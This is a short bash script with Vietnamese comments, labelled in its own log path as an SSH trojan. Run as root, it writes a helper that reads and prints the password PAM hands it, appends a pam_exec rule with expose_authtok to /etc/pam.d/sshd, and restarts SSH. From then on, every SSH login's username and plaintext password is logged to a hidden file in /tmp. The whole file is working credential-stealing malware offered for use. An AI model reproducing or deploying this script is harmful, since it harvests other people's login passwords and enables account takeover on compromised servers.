#!/bin/bash

# Đường dẫn đến file log
log_file="/tmp/.log_sshtrojan1.txt"

# Đường dẫn đến script lấy thông tin đăng nhập SSH
ssh_login_script="/usr/local/bin/sshlogininfo.sh"

# Đường dẫn đến file cấu hình PAM của SSH
pam_ssh_config="/etc/pam.d/sshd"

# Kiểm tra xem script đang được chạy với quyền root không
if [[ $EUID -ne 0 ]]; then
    echo "Bạn cần có quyền root để chạy file này!"
    exit 1
fi

# Kiểm tra xem file log đã tồn tại chưa, nếu chưa thì tạo mới
if [[ -e $log_file ]]; then 
    echo "File $log_file đã tồn tại."
else
    echo "Tạo file $log_file thành công." 
    touch $log_file
fi

# Kiểm tra xem script lấy thông tin đăng nhập SSH đã tồn tại chưa, nếu chưa thì tạo mới
if [[ -e $ssh_login_script ]]; then 
    echo "File $ssh_login_script đã tồn tại."
else
    echo "Tạo file $ssh_login_script thành công." 
    touch $ssh_login_script
fi

# Tạo nội dung cho script lấy thông tin đăng nhập SSH
cat > $ssh_login_script << EOF
#!/bin/bash
read PASSWORD
echo "Username: \$PAM_USER"
echo "Password: \$PASSWORD"
EOF

# Cấp quyền thực thi cho script lấy thông tin đăng nhập SSH
chmod +x $ssh_login_script

# Ghi vào file cấu hình PAM của SSH để sử dụng module pam_exec
cat >> $pam_ssh_config << EOF
@include common-auth
auth required pam_exec.so expose_authtok seteuid log=$log_file $ssh_login_script
EOF

# Khởi động lại dịch vụ SSH để áp dụng cấu hình mới
/etc/init.d/ssh restart
echo "Khởi động lại dịch vụ SSH"
